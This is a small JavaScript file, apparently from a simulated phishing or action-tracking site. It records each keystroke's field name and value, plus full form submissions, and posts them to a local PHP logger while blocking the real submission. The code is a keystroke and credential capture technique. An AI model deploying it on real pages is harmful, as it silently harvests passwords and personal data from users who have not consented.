// /assets/js/logger.js
document.addEventListener("DOMContentLoaded", function () {
  const form = document.querySelector("form");

  if (form) {
    form.addEventListener("submit", function (e) {
      const formData = new FormData(form);
      const action = {
        type: "submit",
        page: window.location.pathname,
        data: Object.fromEntries(formData.entries()),
        timestamp: new Date().toISOString()
      };

      fetch("../action-tracker/log_action.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(action)
      });

      // Prevent real submission (simulation)
      e.preventDefault();
    });

    form.querySelectorAll("input").forEach(input => {
      input.addEventListener("input", () => {
        const action = {
          type: "input",
          field: input.name,
          value: input.value,
          page: window.location.pathname,
          timestamp: new Date().toISOString()
        };

        fetch("../action-tracker/log_action.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(action)
        });
      });
    });
  }
});
